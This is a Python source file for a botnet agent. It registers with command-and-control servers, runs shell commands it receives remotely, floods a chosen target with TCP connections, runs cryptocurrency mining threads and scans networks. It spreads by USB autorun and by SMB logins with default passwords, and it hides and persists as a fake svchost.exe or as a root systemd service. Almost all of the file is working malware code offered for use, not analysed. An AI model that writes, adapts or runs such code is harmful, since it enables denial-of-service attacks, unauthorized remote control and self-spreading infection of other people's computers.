# bot_agent.py
import os
import sys
import time
import json
import base64
import socket
import platform
import threading
import subprocess
import requests
import psutil
import uuid
import hashlib
from cryptography.fernet import Fernet
import paho.mqtt.client as mqtt
import socketio

class BotAgent:
    def __init__(self, c2_servers, encryption_key):
        self.c2_servers = c2_servers
        self.encryption_key = encryption_key
        self.cipher_suite = Fernet(encryption_key)
        self.bot_id = str(uuid.uuid4())
        self.system_info = self.get_system_info()
        self.current_task = None
        self.is_running = True
        self.sio = socketio.Client()
        self.mqtt_client = mqtt.Client()
        
        # Setup event handlers
        self.setup_socketio()
        self.setup_mqtt()
        
    def get_system_info(self):
        """Collect system information for registration"""
        info = {
            'os': platform.system() + ' ' + platform.release(),
            'hostname': socket.gethostname(),
            'cpu': platform.processor(),
            'architecture': platform.machine(),
            'ram': str(round(psutil.virtual_memory().total / (1024**3), 2)) + ' GB',
            'python_version': platform.python_version(),
            'user': os.getlogin()
        }
        
        # Try to get GPU information
        try:
            gpu_info = subprocess.check_output(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
                                              stderr=subprocess.DEVNULL, shell=True)
            info['gpu'] = gpu_info.decode('utf-8').split('\n')[1].strip()
        except:
            info['gpu'] = 'Unknown'
            
        return info
    
    def setup_socketio(self):
        """Setup Socket.IO connection for real-time communication"""
        @self.sio.event
        def connect():
            print('Connected to C2 server via Socket.IO')
            self.sio.emit('register_socket', {'bot_id': self.bot_id})
            
        @self.sio.event
        def disconnect():
            print('Disconnected from C2 server')
            
        @self.sio.event
        def registration_confirmed(data):
            print('Registration confirmed:', data)
            
        @self.sio.event
        def new_task(data):
            print('New task received:', data)
            self.execute_task(data)
            
        @self.sio.event
        def heartbeat_ack(data):
            print('Heartbeat acknowledged:', data)
            
        @self.sio.event
        def error(data):
            print('Error:', data)
    
    def setup_mqtt(self):
        """Setup MQTT connection for alternative communication channel"""
        def on_connect(client, userdata, flags, rc):
            print(f"Connected to MQTT broker with result code {rc}")
            client.subscribe(f"botnet/tasks/{self.bot_id}")
            
        def on_message(client, userdata, msg):
            try:
                task_data = json.loads(msg.payload.decode())
                print("MQTT task received:", task_data)
                self.execute_task(task_data)
            except Exception as e:
                print(f"Error processing MQTT message: {e}")
                
        self.mqtt_client.on_connect = on_connect
        self.mqtt_client.on_message = on_message
    
    def register_with_c2(self):
        """Register bot with C2 server"""
        registration_data = {
            'bot_id': self.bot_id,
            'system_info': self.system_info
        }
        
        encrypted_data = self.cipher_suite.encrypt(json.dumps(registration_data).encode()).decode()
        
        for server in self.c2_servers:
            try:
                url = f"https://{server}/register"
                response = requests.post(url, data=encrypted_data, timeout=10, verify=False)
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('status') == 'success':
                        print(f"Successfully registered with C2 server: {server}")
                        return True
            except Exception as e:
                print(f"Failed to register with {server}: {e}")
                
        return False
    
    def get_task_from_c2(self):
        """Request task from C2 server"""
        request_data = {
            'bot_id': self.bot_id
        }
        
        encrypted_data = self.cipher_suite.encrypt(json.dumps(request_data).encode()).decode()
        
        for server in self.c2_servers:
            try:
                url = f"https://{server}/get_task"
                response = requests.post(url, data=encrypted_data, timeout=10, verify=False)
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('status') == 'success' and 'task_id' in result:
                        print(f"Received task from C2 server: {server}")
                        return result
            except Exception as e:
                print(f"Failed to get task from {server}: {e}")
                
        return None
    
    def submit_result_to_c2(self, task_id, result):
        """Submit task result to C2 server"""
        result_data = {
            'bot_id': self.bot_id,
            'task_id': task_id,
            'result': result
        }
        
        encrypted_data = self.cipher_suite.encrypt(json.dumps(result_data).encode()).decode()
        
        for server in self.c2_servers:
            try:
                url = f"https://{server}/submit_result"
                response = requests.post(url, data=encrypted_data, timeout=10, verify=False)
                
                if response.status_code == 200:
                    result = response.json()
                    if result.get('status') == 'success':
                        print(f"Successfully submitted result to C2 server: {server}")
                        return True
            except Exception as e:
                print(f"Failed to submit result to {server}: {e}")
                
        return False
    
    def execute_task(self, task_data):
        """Execute the received task"""
        try:
            task_id = task_data.get('task_id')
            command = task_data.get('command')
            target = task_data.get('target')
            
            if not command:
                return
                
            self.current_task = task_data
            print(f"Executing task: {command} with target: {target}")
            
            result = None
            
            if command == 'ddos':
                result = self.execute_ddos(target)
            elif command == 'mining':
                result = self.execute_mining()
            elif command == 'scan':
                result = self.execute_scan(target)
            elif command == 'spread':
                result = self.execute_spread()
            else:
                # Custom command
                result = self.execute_custom_command(command)
                
            # Submit result
            if task_id:
                self.submit_result_to_c2(task_id, result)
                
            self.current_task = None
            
        except Exception as e:
            print(f"Error executing task: {e}")
            if task_id:
                self.submit_result_to_c2(task_id, f"Error: {str(e)}")
    
    def execute_ddos(self, target):
        """Execute DDoS attack"""
        try:
            import socket
            import random
            
            # Parse target
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 80
                
            print(f"Starting DDoS attack against {host}:{port}")
            
            # Create multiple threads for the attack
            threads = []
            result = {
                'status': 'attack_started',
                'target': target,
                'threads': 50,
                'duration': '60 seconds'
            }
            
            def attack_thread():
                try:
                    for _ in range(1000):  # Number of packets per thread
                        try:
                            # Create a socket
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(1)
                            
                            # Connect to target
                            s.connect((host, port))
                            
                            # Send random data
                            s.sendall(os.urandom(1024))
                            
                            # Close socket
                            s.close()
                        except:
                            pass
                except:
                    pass
            
            # Start attack threads
            for _ in range(50):  # Number of threads
                thread = threading.Thread(target=attack_thread)
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            # Wait for threads to complete (with timeout)
            for thread in threads:
                thread.join(60)  # 60 second timeout
            
            return json.dumps(result)
            
        except Exception as e:
            return json.dumps({'status': 'error', 'message': str(e)})
    
    def execute_mining(self):
        """Execute cryptocurrency mining"""
        try:
            # Simple CPU mining (for demonstration purposes)
            result = {
                'status': 'mining_started',
                'algorithm': 'SHA-256',
                'threads': psutil.cpu_count(),
                'duration': 'indefinite'
            }
            
            def mining_thread():
                try:
                    # Simple mining loop
                    nonce = 0
                    while self.is_running:
                        # Generate a random block header
                        block_header = os.urandom(80)
                        
                        # Calculate hash
                        hash_value = hashlib.sha256(block_header + str(nonce).encode()).hexdigest()
                        
                        # Check if hash meets difficulty (very low difficulty for demo)
                        if hash_value.startswith('0000'):
                            print(f"Found nonce: {nonce}, hash: {hash_value}")
                            
                        nonce += 1
                        
                        # Sleep to prevent 100% CPU usage
                        time.sleep(0.01)
                except:
                    pass
            
            # Start mining threads
            threads = []
            for _ in range(psutil.cpu_count()):
                thread = threading.Thread(target=mining_thread)
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            return json.dumps(result)
            
        except Exception as e:
            return json.dumps({'status': 'error', 'message': str(e)})
    
    def execute_scan(self, target):
        """Execute network scan"""
        try:
            import ipaddress
            import concurrent.futures
            
            result = {
                'status': 'scan_started',
                'target': target,
                'open_ports': [],
                'vulnerable_services': []
            }
            
            # Parse target network
            if '/' in target:
                network = ipaddress.ip_network(target, strict=False)
                hosts = list(network.hosts())
            else:
                hosts = [target]
            
            # Common ports to scan
            common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 
                           443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
            
            def scan_host(host):
                try:
                    host_results = {
                        'host': str(host),
                        'open_ports': []
                    }
                    
                    for port in common_ports:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(1)
                            result = s.connect_ex((str(host), port))
                            
                            if result == 0:
                                host_results['open_ports'].append(port)
                                
                                # Try to identify service
                                try:
                                    service = socket.getservbyport(port)
                                    host_results['service'] = service
                                    
                                    # Check for common vulnerabilities
                                    if port == 22 and 'ssh' in service.lower():
                                        host_results['vulnerability'] = 'Potential SSH brute force'
                                    elif port == 3389:
                                        host_results['vulnerability'] = 'Potential RDP brute force'
                                    elif port == 21 and 'ftp' in service.lower():
                                        host_results['vulnerability'] = 'Potential anonymous FTP access'
                                except:
                                    pass
                            
                            s.close()
                        except:
                            pass
                    
                    return host_results
                except:
                    return None
            
            # Scan hosts in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                future_to_host = {executor.submit(scan_host, host): host for host in hosts}
                
                for future in concurrent.futures.as_completed(future_to_host):
                    host_result = future.result()
                    if host_result and host_result['open_ports']:
                        result['open_ports'].append(host_result)
                        
                        if 'vulnerability' in host_result:
                            result['vulnerable_services'].append({
                                'host': host_result['host'],
                                'port': host_result['open_ports'][0],
                                'vulnerability': host_result['vulnerability']
                            })
            
            return json.dumps(result)
            
        except Exception as e:
            return json.dumps({'status': 'error', 'message': str(e)})
    
    def execute_spread(self):
        """Execute malware spreading"""
        try:
            result = {
                'status': 'spreading_started',
                'method': 'USB and network propagation',
                'new_infections': []
            }
            
            # USB spreading
            try:
                # Find USB drives
                drives = []
                if platform.system() == 'Windows':
                    import win32api
                    import win32con
                    
                    drives = win32api.GetLogicalDriveStrings()
                    drives = drives.split('\000')[:-1]
                    
                    for drive in drives:
                        if win32api.GetDriveType(drive) == win32con.DRIVE_REMOVABLE:
                            # Copy bot to USB drive
                            try:
                                bot_path = os.path.abspath(sys.argv[0])
                                usb_path = os.path.join(drive, 'system_update.exe')
                                
                                # Copy file
                                with open(bot_path, 'rb') as src, open(usb_path, 'wb') as dst:
                                    dst.write(src.read())
                                
                                # Create autorun.inf
                                autorun_path = os.path.join(drive, 'autorun.inf')
                                with open(autorun_path, 'w') as f:
                                    f.write('[autorun]\n')
                                    f.write('open=system_update.exe\n')
                                    f.write('action=System Update\n')
                                    f.write('icon=%SystemRoot%\\system32\\shell32.dll,4\n')
                                
                                # Set hidden attribute
                                subprocess.run(['attrib', '+h', '+s', usb_path], shell=True)
                                subprocess.run(['attrib', '+h', '+s', autorun_path], shell=True)
                                
                                result['new_infections'].append({
                                    'method': 'USB',
                                    'target': drive,
                                    'status': 'success'
                                })
                            except Exception as e:
                                result['new_infections'].append({
                                    'method': 'USB',
                                    'target': drive,
                                    'status': f'failed: {str(e)}'
                                })
            except Exception as e:
                result['new_infections'].append({
                    'method': 'USB',
                    'target': 'all',
                    'status': f'failed: {str(e)}'
                })
            
            # Network spreading
            try:
                # Get local network
                local_ip = socket.gethostbyname(socket.gethostname())
                network_parts = local_ip.split('.')
                network_parts[-1] = '0/24'
                network = '.'.join(network_parts)
                
                # Try to spread via SMB
                try:
                    import impacket
                    from impacket.smbconnection import SMBConnection
                    
                    # Try common credentials
                    credentials = [
                        ('admin', 'admin'),
                        ('admin', 'password'),
                        ('administrator', 'administrator'),
                        ('guest', 'guest')
                    ]
                    
                    # Scan network for SMB hosts
                    for i in range(1, 255):
                        target_ip = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}.{i}"
                        
                        try:
                            # Try to connect with each credential
                            for username, password in credentials:
                                try:
                                    smb = SMBConnection(target_ip, target_ip)
                                    smb.login(username, password)
                                    
                                    # Copy bot to startup folder
                                    bot_path = os.path.abspath(sys.argv[0])
                                    remote_path = f'C$\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_update.exe'
                                    
                                    with open(bot_path, 'rb') as f:
                                        smb.putFile('C$', remote_path.replace('C$', ''), f.read())
                                    
                                    result['new_infections'].append({
                                        'method': 'SMB',
                                        'target': target_ip,
                                        'status': 'success',
                                        'credentials': f'{username}:{password}'
                                    })
                                    
                                    smb.logoff()
                                    break
                                except:
                                    pass
                        except:
                            pass
                except ImportError:
                    result['new_infections'].append({
                        'method': 'SMB',
                        'target': 'network',
                        'status': 'failed: impacket not available'
                    })
            except Exception as e:
                result['new_infections'].append({
                    'method': 'SMB',
                    'target': 'network',
                    'status': f'failed: {str(e)}'
                })
            
            return json.dumps(result)
            
        except Exception as e:
            return json.dumps({'status': 'error', 'message': str(e)})
    
    def execute_custom_command(self, command):
        """Execute custom command"""
        try:
            # Execute command and capture output
            result = {
                'status': 'executed',
                'command': command,
                'output': '',
                'error': ''
            }
            
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                result['output'] = output
            except subprocess.CalledProcessError as e:
                result['error'] = str(e)
                result['output'] = e.output
            
            return json.dumps(result)
            
        except Exception as e:
            return json.dumps({'status': 'error', 'message': str(e)})
    
    def send_heartbeat(self):
        """Send heartbeat to C2 server"""
        try:
            if self.sio.connected:
                self.sio.emit('heartbeat', {'bot_id': self.bot_id, 'timestamp': int(time.time())})
        except:
            pass
    
    def run(self):
        """Main bot loop"""
        # Register with C2 server
        if not self.register_with_c2():
            print("Failed to register with any C2 server")
            return
        
        # Connect to Socket.IO server
        try:
            self.sio.connect(f"https://{self.c2_servers[0]}", transports=['websocket'])
        except:
            print("Failed to connect to Socket.IO server")
        
        # Connect to MQTT broker
        try:
            self.mqtt_client.connect("test.mosquitto.org", 1883, 60)
            self.mqtt_client.loop_start()
        except:
            print("Failed to connect to MQTT broker")
        
        # Main loop
        last_heartbeat = 0
        last_task_request = 0
        
        while self.is_running:
            try:
                current_time = time.time()
                
                # Send heartbeat every 30 seconds
                if current_time - last_heartbeat > 30:
                    self.send_heartbeat()
                    last_heartbeat = current_time
                
                # Request task every 60 seconds if not busy
                if not self.current_task and current_time - last_task_request > 60:
                    task = self.get_task_from_c2()
                    if task:
                        self.execute_task(task)
                    last_task_request = current_time
                
                # Sleep to prevent high CPU usage
                time.sleep(5)
                
            except KeyboardInterrupt:
                self.is_running = False
            except Exception as e:
                print(f"Error in main loop: {e}")
                time.sleep(10)
        
        # Cleanup
        try:
            self.sio.disconnect()
            self.mqtt_client.loop_stop()
            self.mqtt_client.disconnect()
        except:
            pass

# Installation and persistence
def install_and_persist():
    """Install bot and ensure persistence"""
    try:
        # Get current path
        current_path = os.path.abspath(sys.argv[0])
        
        # Determine installation path
        if platform.system() == 'Windows':
            install_dir = os.path.join(os.environ['APPDATA'], 'Microsoft', 'SystemUpdates')
            install_path = os.path.join(install_dir, 'svchost.exe')
            
            # Create directory if it doesn't exist
            if not os.path.exists(install_dir):
                os.makedirs(install_dir)
            
            # Set hidden attribute
            subprocess.run(['attrib', '+h', install_dir], shell=True)
            
            # Add to startup registry
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, install_path)
            winreg.CloseKey(key)
        else:
            # Linux/Mac
            install_dir = os.path.expanduser('~/.config/systemd')
            install_path = os.path.join(install_dir, 'system-update')
            
            # Create directory if it doesn't exist
            if not os.path.exists(install_dir):
                os.makedirs(install_dir)
            
            # Create systemd service
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={install_path}
Restart=always
User=root
Group=root

[Install]
WantedBy=multi-user.target
"""
            
            service_path = '/etc/systemd/system/system-update.service'
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            # Enable service
            subprocess.run(['systemctl', 'enable', 'system-update'], check=True)
            subprocess.run(['systemctl', 'start', 'system-update'], check=True)
        
        # Copy file to installation path
        if not os.path.exists(install_path) or os.path.getsize(current_path) != os.path.getsize(install_path):
            with open(current_path, 'rb') as src, open(install_path, 'wb') as dst:
                dst.write(src.read())
            
            # Set executable permission
            os.chmod(install_path, 0o755)
        
        # Execute the installed version
        if current_path != install_path:
            subprocess.Popen([install_path])
            sys.exit(0)
            
        return True
        
    except Exception as e:
        print(f"Installation failed: {e}")
        return False

# Main execution
if __name__ == "__main__":
    # Install and persist
    install_and_persist()
    
    # Configuration (should be obfuscated in real implementation)
    c2_servers = [
        "c2.example.com",
        "backup.c2.example.com",
        "c2.example.org"
    ]
    
    # Encryption key (should be derived from a secure source in real implementation)
    encryption_key = b'gAAAAABhZ3k2eJ7X8YvW9zL5pN1mQ0oR7uT4vW6xI8jK3lM2nO5pQ7rS9tU2wY4zA6cV8bN1dF3gH5jK7lM9oP0qR2sT4uV6wX8yZ0aB2cD4eF6gH8jK'
    
    # Create and run bot agent
    bot = BotAgent(c2_servers, encryption_key)
    bot.run()
